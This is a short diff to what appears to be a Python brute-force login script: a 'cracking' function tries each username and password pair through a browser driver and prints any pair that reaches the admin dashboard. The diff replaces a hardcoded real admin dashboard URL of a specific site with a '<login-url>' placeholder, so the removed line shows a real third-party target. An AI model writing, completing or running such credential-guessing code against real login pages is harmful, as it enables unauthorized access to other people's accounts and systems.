@@ -44,7 +44,8 @@ def cracking(username_list, password_list, driver):
 
             attempt_login(username, password, driver)
 
-            if 'https://a2padmin.mnpspbd.com/dashboard' in driver.current_url:
+            # Replace '<login-url>' with your actual login URL
+            if '<login-url>' in driver.current_url:
                 print(f'[+] Found Username: ==> {username}')
                 print(f'[+] Found Password: ==> {password}')
                 return True
